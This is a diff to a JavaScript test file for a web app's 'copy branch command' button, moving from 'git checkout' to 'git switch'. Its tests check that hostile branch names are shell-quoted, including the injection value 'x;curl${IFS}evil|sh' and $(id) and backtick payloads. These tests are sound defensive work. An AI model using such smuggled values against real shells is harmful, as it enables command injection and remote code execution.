@@ -1,11 +1,11 @@
 import { test, mock } from 'node:test';
 import assert from 'node:assert/strict';
-import { checkoutCommand, handleCopyClick } from '../public/copy-branch.js';
+import { switchCommand, handleCopyClick } from '../public/copy-branch.js';
 import { node } from './fake-dom.mjs';
 
 // A copy button as app-render.js draws it: its icons, what it copies, its tooltip
-function copyButton(copy = 'git checkout feat-a') {
-    const button = node({ tag: 'button', classes: ['copy-button', 'copy-checkout'], dataset: { copy } },
+function copyButton(copy = 'git switch feat-a') {
+    const button = node({ tag: 'button', classes: ['copy-button', 'copy-switch'], dataset: { copy } },
         node({ tag: 'i', classes: ['fas', 'fa-terminal', 'copy-icon'] }));
     button.title = `Copy: ${copy}`;
     return button;
@@ -42,38 +42,30 @@ const runTimers = timers => {
     }
 };
 
-test('checkoutCommand leaves a plain branch name bare', () => {
-    assert.equal(checkoutCommand('feature/ABC-123-export'), 'git checkout feature/ABC-123-export --');
-    assert.equal(checkoutCommand('release_2.1+hotfix@x=y,z%20'), 'git checkout release_2.1+hotfix@x=y,z%20 --');
+test('switchCommand leaves a plain branch name bare', () => {
+    assert.equal(switchCommand('feature/ABC-123-export'), 'git switch feature/ABC-123-export');
+    assert.equal(switchCommand('release_2.1+hotfix@x=y,z%20'), 'git switch release_2.1+hotfix@x=y,z%20');
 });
 
-test('checkoutCommand puts in single quotes a name the shell would read: $, ;, |, &, a backtick, parentheses, quotes, !, #, braces', () => {
-    assert.equal(checkoutCommand('x;curl${IFS}evil|sh'), "git checkout 'x;curl${IFS}evil|sh' --");
-    assert.equal(checkoutCommand('a&b'), "git checkout 'a&b' --");
-    assert.equal(checkoutCommand('a`id`'), "git checkout 'a`id`' --");
-    assert.equal(checkoutCommand('a$(id)'), "git checkout 'a$(id)' --");
-    assert.equal(checkoutCommand('a"b!c#d{e}'), `git checkout 'a"b!c#d{e}' --`);
-    assert.equal(checkoutCommand('é'), "git checkout 'é' --");
+test('switchCommand puts in single quotes a name the shell would read: $, ;, |, &, a backtick, parentheses, quotes, !, #, braces', () => {
+    assert.equal(switchCommand('x;curl${IFS}evil|sh'), "git switch 'x;curl${IFS}evil|sh'");
+    assert.equal(switchCommand('a&b'), "git switch 'a&b'");
+    assert.equal(switchCommand('a`id`'), "git switch 'a`id`'");
+    assert.equal(switchCommand('a$(id)'), "git switch 'a$(id)'");
+    assert.equal(switchCommand('a"b!c#d{e}'), `git switch 'a"b!c#d{e}'`);
+    assert.equal(switchCommand('é'), "git switch 'é'");
 });
 
-test('checkoutCommand writes a single quote in the name as \'\\\'\'', () => {
-    assert.equal(checkoutCommand("it's"), "git checkout 'it'\\''s' --");
+test('switchCommand writes a single quote in the name as \'\\\'\'', () => {
+    assert.equal(switchCommand("it's"), "git switch 'it'\\''s'");
 });
 
-// `git checkout docs`, with origin/docs not fetched yet, restores the folder
-// docs/ from the index, losing its changes; the trailing -- makes the name a
-// branch only: git still creates it from a fetched remote branch, and fails
-// otherwise
-test('checkoutCommand ends with -- so that a branch named like a path is never read as one', () => {
-    assert.equal(checkoutCommand('docs'), 'git checkout docs --');
-});
-
-// refs/heads/-f can be pushed with plain git: `git checkout -f` would throw
-// the uncommitted changes away
-test('checkoutCommand ends the options before a name starting with -, which git would read as an option', () => {
-    assert.equal(checkoutCommand('-f'), 'git checkout --end-of-options -f --');
-    assert.equal(checkoutCommand('--detach'), 'git checkout --end-of-options --detach --');
-    assert.equal(checkoutCommand('-a;b'), "git checkout --end-of-options '-a;b' --");
+// refs/heads/--detach can be pushed with plain git: `git switch --detach`
+// would leave the branch for a detached HEAD
+test('switchCommand ends the options before a name starting with -, which git would read as an option', () => {
+    assert.equal(switchCommand('-f'), 'git switch --end-of-options -f');
+    assert.equal(switchCommand('--detach'), 'git switch --end-of-options --detach');
+    assert.equal(switchCommand('-a;b'), "git switch --end-of-options '-a;b'");
 });
 
 test('handleCopyClick takes no click outside a copy button and writes nothing', async () => {
@@ -90,21 +82,21 @@ test('handleCopyClick copies what the button carries, from the button or its ico
     const button = copyButton();
     assert.equal(handleCopyClick({ target: button.firstElementChild }, options), true);
     await settled();
-    assert.deepEqual(written, ['git checkout feat-a']);
+    assert.deepEqual(written, ['git switch feat-a']);
     assert.ok(button.classList.contains('copied'));
     assert.ok(!button.classList.contains('copy-failed'));
-    assert.equal(button.title, 'Copied: git checkout feat-a');
-    assert.equal(options.status.textContent, 'Copied: git checkout feat-a');
+    assert.equal(button.title, 'Copied: git switch feat-a');
+    assert.equal(options.status.textContent, 'Copied: git switch feat-a');
     assert.deepEqual([...timers.values()].map(({ delay }) => delay), [1500]);
 
     runTimers(timers);
     assert.ok(!button.classList.contains('copied'));
-    assert.equal(button.title, 'Copy: git checkout feat-a');
+    assert.equal(button.title, 'Copy: git switch feat-a');
     assert.equal(options.status.textContent, '');
 
     assert.equal(handleCopyClick({ target: button }, options), true);
     await settled();
-    assert.deepEqual(written, ['git checkout feat-a', 'git checkout feat-a']);
+    assert.deepEqual(written, ['git switch feat-a', 'git switch feat-a']);
 });
 
 test('handleCopyClick says the clipboard needs https or localhost when the page has none', async () => {
@@ -118,14 +110,14 @@ test('handleCopyClick says the clipboard needs https or localhost when the page 
     assert.equal(options.status.textContent, 'Copy failed: the clipboard needs https or localhost');
     runTimers(timers);
     assert.ok(!button.classList.contains('copy-failed'));
-    assert.equal(button.title, 'Copy: git checkout feat-a');
+    assert.equal(button.title, 'Copy: git switch feat-a');
 });
 
 // Safari keeps the user activation a clipboard write needs during the event only
 test('handleCopyClick writes to the clipboard during the click itself', () => {
     const { written, options } = fakes();
     handleCopyClick({ target: copyButton() }, options);
-    assert.deepEqual(written, ['git checkout feat-a']);
+    assert.deepEqual(written, ['git switch feat-a']);
 });
 
 test('handleCopyClick gives the reason of a refused write, thrown or rejected', async () => {
@@ -151,7 +143,7 @@ test('handleCopyClick restarts the 1.5 s on a second click, and the tooltip come
     assert.ok(button.classList.contains('copied'));
     runTimers(timers);
     assert.ok(!button.classList.contains('copied'));
-    assert.equal(button.title, 'Copy: git checkout feat-a');
+    assert.equal(button.title, 'Copy: git switch feat-a');
 });
 
 test('handleCopyClick leaves the status region alone at the end of a copy when a later copy wrote it', async () => {
